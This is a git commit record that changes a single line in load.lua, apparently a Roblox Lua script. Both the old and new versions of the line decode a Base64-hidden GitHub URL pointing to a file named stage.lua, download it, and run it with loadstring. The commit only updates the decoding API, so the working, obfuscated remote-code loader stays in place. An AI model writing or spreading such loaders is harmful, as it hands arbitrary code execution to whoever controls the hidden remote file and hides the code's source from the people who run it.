c932717b69c076977ad2ffdd7ec4fa920cdebb3e
wtfx0rzz-mark <wtfmark@pm.me>
2026-02-14 17:10:03 -0600

    Update load.lua

--- load.lua
+++ load.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(game:GetService("HttpService"):Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3d0Zngwcnp6LW1hcmsvcHViLWh6a2pzZGZoOTgzaGNvc2VkZi05OS9tYWluL3N0YWdlLmx1YQ==")))()
+loadstring(game:HttpGet(buffer.tostring(game:GetService("EncodingService"):Base64Decode(buffer.fromstring("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3d0Zngwcnp6LW1hcmsvcHViLWh6a2pzZGZoOTgzaGNvc2VkZi05OS9tYWluL3N0YWdlLmx1YQ==")))))()
